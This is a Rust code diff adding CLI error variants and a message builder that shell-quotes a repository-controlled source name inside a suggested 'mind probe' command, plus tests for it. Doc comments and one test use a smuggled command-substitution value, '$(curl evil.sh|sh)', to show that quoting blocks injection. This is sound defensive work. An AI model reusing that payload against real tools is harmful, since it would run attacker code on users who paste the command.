@@ -506,6 +506,70 @@ pub enum MindError {
     )]
     LinkNotASkill { source_name: String, path: String },
 
+    /// LNK-18: an item-link instance's catalog is exactly the linked skill
+    /// (LNK-7), so a `{{ns:name}}` token naming a sibling can never resolve, no
+    /// matter how the repo is laid out. This variant is not limited to that
+    /// token: it is also raised for a `{{tools:name}}` or `{{path:kind:name}}`
+    /// token naming a sibling, since a single-skill link has no siblings for
+    /// either to reach. A token must be rewritten into the item body (NS-10),
+    /// so unlike a `requires` entry it cannot be left dangling: this is a hard
+    /// error that names the one-command remedy.
+    ///
+    /// DSC-95: `item`, `referent`, and `in_source` are all source-controlled
+    /// and interpolated verbatim, so each is sanitized at the call site;
+    /// `remedy` is composed there from a shell-quoted, sanitized URL and item
+    /// name.
+    #[error(
+        "{item}: reference {referent} names a sibling, but source '{in_source}' is a single-skill item link with no siblings; meld the whole repo and install just this skill: `{remedy}`"
+    )]
+    LinkRefUnsatisfiable {
+        item: String,
+        referent: String,
+        in_source: String,
+        remedy: String,
+    },
+
+    /// CLI-236: a `meld --learn <GLOB>` value that is not usable as a pattern
+    /// at all (empty, source-qualified, malformed as a ref, or a malformed
+    /// glob). `reason` is a short clause naming which, so the four cases are
+    /// not collapsed into one blunt "invalid ref" that describes forms the flag
+    /// does not even accept.
+    #[error("invalid --learn pattern '{pattern}': {reason}")]
+    InvalidLearnPattern { pattern: String, reason: String },
+
+    /// CLI-236: a `--learn` pattern that parses but matches no item in the
+    /// source being melded. Distinct from the generic `ItemNotFound`, whose
+    /// message reports a search across every melded source: this search was
+    /// scoped to one source, and the two things that most often explain a miss
+    /// (an inventory that does not declare the item, and a super-source whose
+    /// nested sources register separately) are specific to that scope. Points
+    /// at `mind probe --source <name> --no-tui`, not `recall`: `recall` lists
+    /// what is INSTALLED, and after a no-match nothing from this source is
+    /// installed, so it would answer with an empty listing that contradicts
+    /// the message's own claim of what it lists.
+    ///
+    /// DSC-95/CLI-225: `source_name` is source-controlled (an item-link
+    /// identity embeds a repo-controlled path, `host/owner/repo#<item_path>`,
+    /// and `item_path` is validated only against traversal, not shell
+    /// metacharacters), so it is sanitized with `strip_ansi` and, for the
+    /// occurrence inside the backticked `mind probe` command, also
+    /// `shell_quote`d before composition -- the same pattern
+    /// `hooks_not_run_message`/`ambiguous_hook_target_message` use. Without
+    /// quoting, a repo shipping e.g. `skills/x$(curl evil.sh|sh)/SKILL.md`
+    /// could make this message's own suggested remedy execute an attacker
+    /// command when pasted. `pattern` is prose only (never placed inside a
+    /// command here) but is sanitized too, defensively. The `--add-root`
+    /// caveat notes it only takes effect at the meld that first registers the
+    /// source (L4): after a `--learn` miss the source is already registered,
+    /// so the flag is silently ignored unless the caller unmelds first.
+    // `source` is reserved by thiserror (see the note on CuratorAllNestedFailed),
+    // so the source's name rides as `source_name` here too.
+    #[error("{}", learn_no_match_message(pattern, source_name))]
+    LearnPatternNoMatch {
+        pattern: String,
+        source_name: String,
+    },
+
     /// DSC-95: `source_name` and `name` are both source-controlled (the
     /// source's own identity and an item name discovered under one of its scan
     /// roots), and `main.rs` prints this message verbatim via
@@ -1105,6 +1169,24 @@ fn duplicate_item_message(source_name: &str, kind: ItemKind, name: &str) -> Stri
     )
 }
 
+/// The [`MindError::LearnPatternNoMatch`] message (CLI-236, CLI-225, DSC-95).
+/// See the variant's doc comment for why `source_name` is both sanitized and,
+/// for the occurrence inside the backticked `mind probe` command, shell-quoted:
+/// it is source-controlled (an item-link identity embeds a repo-controlled
+/// path) and this message is its own suggested remedy, so an unquoted
+/// occurrence would let a hostile repo turn the remedy into an injection when
+/// pasted, exactly the class of bug `hooks_not_run_message` closed for HOOK-106
+/// and generalized here as CLI-225. `pattern` never appears inside a command
+/// here, but is sanitized too, defensively.
+fn learn_no_match_message(pattern: &str, source_name: &str) -> String {
+    let pattern = crate::sanitize::strip_ansi(pattern);
+    let source_name = crate::sanitize::strip_ansi(source_name);
+    let quoted = shell_quote(&source_name);
+    format!(
+        "--learn pattern '{pattern}' matches no item in source '{source_name}'; run `mind probe --source {quoted} --no-tui` to list what it offers. An item the source's inventory does not declare needs `--add-root <dir>` at the meld that registers the source (`unmeld` first if it is already melded), and a curated super-source's nested sources register as their own sources"
+    )
+}
+
 fn status_suffix(status: Option<ExitStatus>) -> String {
     match status.and_then(|s| s.code()) {
         Some(code) => format!(" (exit {code})"),
@@ -1175,6 +1257,9 @@ impl MindError {
             MindError::BadPinSpec { .. } => "bad-pin-spec",
             MindError::InvalidRoot { .. } => "invalid-root",
             MindError::LinkNotASkill { .. } => "link-not-a-skill",
+            MindError::LinkRefUnsatisfiable { .. } => "link-ref-unsatisfiable",
+            MindError::InvalidLearnPattern { .. } => "invalid-learn-pattern",
+            MindError::LearnPatternNoMatch { .. } => "learn-pattern-no-match",
             MindError::DuplicateItem { .. } => "duplicate-item",
             MindError::ReviewFailed { .. } => "review-failed",
             MindError::SourceNotAllowed { .. } => "source-not-allowed",
@@ -1427,6 +1512,101 @@ mod tests {
     fn hooks_not_run_message_asserts_resolved_is_never_empty() {
         // spec: HOOK-106
         let _ = hooks_not_run_message("target", "install", 0, &[]);
+    }
+
+    /// CLI-225: `LearnPatternNoMatch`'s remedy is its own suggested `mind probe`
+    /// command, and the source identity it carries is source-controlled: an
+    /// item-link identity is `host/owner/repo#<item_path>`, and `item_path` is
+    /// validated only against traversal, not shell metacharacters, so a
+    /// hostile repo can make this exact identity the source name (e.g. by
+    /// shipping `skills/x$(curl evil.sh|sh)/SKILL.md`). Before the fix, the
+    /// identity was interpolated bare into the backticked command, so pasting
+    /// mind's own advice ran the attacker's payload. This asserts the
+    /// occurrence inside the backticked command is quoted and the payload
+    /// cannot break out of it.
+    #[test]
+    fn learn_no_match_message_shell_quotes_the_source_identity_in_the_command() {
+        // spec: CLI-225 CLI-236
+        let evil = "github.com/o/r#skills/x$(curl evil.sh|sh)";
+        let msg = learn_no_match_message("review", evil);
+
+        assert!(
+            msg.contains(&format!(
+                "mind probe --source {} --no-tui",
+                shell_quote(evil)
+            )),
+            "the printed remedy must carry the shell-quoted identity: {msg}"
+        );
+        assert!(
+            !msg.contains("--source github.com/o/r#skills/x$(curl evil.sh|sh) --no-tui"),
+            "the identity must never appear bare (unquoted) inside the runnable command: {msg}"
+        );
+
+        // Belt-and-braces: run the exact quoted form the message carries
+        // through a real shell and confirm the embedded `$(...)` never
+        // executes -- it must round-trip byte-for-byte instead.
+        if Command::new("sh").arg("-c").arg("true").status().is_err() {
+            return;
+        }
+        let quoted = shell_quote(evil);
+        let output = Command::new("sh")
+            .arg("-c")
+            .arg(format!("printf '%s' {quoted}"))
+            .output()
+            .expect("sh -c must run");
+        assert_eq!(
+            String::from_utf8_lossy(&output.stdout),
+            evil,
+            "the shell must see the identity back exactly as given, proving the \
+             embedded `$(...)` was passed through literally rather than executed"
+        );
+    }
+
+    /// The prose mentions of `pattern` and `source_name` (outside the
+    /// backticked command) stay bare, matching pinned text 3: only the
+    /// command occurrence needs quoting, and quoting the prose too would make
+    /// the message harder to read for the common (non-hostile) case.
+    #[test]
+    fn learn_no_match_message_leaves_prose_mentions_bare() {
+        // spec: CLI-236
+        let msg = learn_no_match_message("review", "my-source");
+        assert!(
+            msg.contains("--learn pattern 'review' matches no item in source 'my-source'"),
+            "{msg}"
+        );
+        assert!(
+            msg.contains("run `mind probe --source 'my-source' --no-tui` to list what it offers"),
+            "{msg}"
+        );
+    }
+
+    /// L4(a): the `--add-root` caveat is part of the pinned message text --
+    /// the flag only takes effect at the meld that first registers a source,
+    /// so after a `--learn` miss (which happens on an already-registered
+    /// source) it is silently ignored unless the caller unmelds first.
+    #[test]
+    fn learn_no_match_message_states_the_add_root_ordering_caveat() {
+        // spec: CLI-236
+        let msg = learn_no_match_message("review", "my-source");
+        assert!(
+            msg.contains(
+                "needs `--add-root <dir>` at the meld that registers the source \
+                 (`unmeld` first if it is already melded)"
+            ),
+            "{msg}"
+        );
+    }
+
+    /// M1/CLI-236: the message points at `mind probe --source <name> --no-tui`
+    /// (which lists what a source OFFERS), never `mind recall` (which lists
+    /// what is INSTALLED and, after a no-match, would report an empty listing
+    /// that contradicts the message's own claim).
+    #[test]
+    fn learn_no_match_message_never_suggests_recall() {
+        // spec: CLI-236
+        let msg = learn_no_match_message("review", "my-source");
+        assert!(!msg.contains("mind recall"), "{msg}");
+        assert!(msg.contains("mind probe --source"), "{msg}");
     }
 
     // HARN-1/HARN-4: the new lobe-related errors render actionable messages
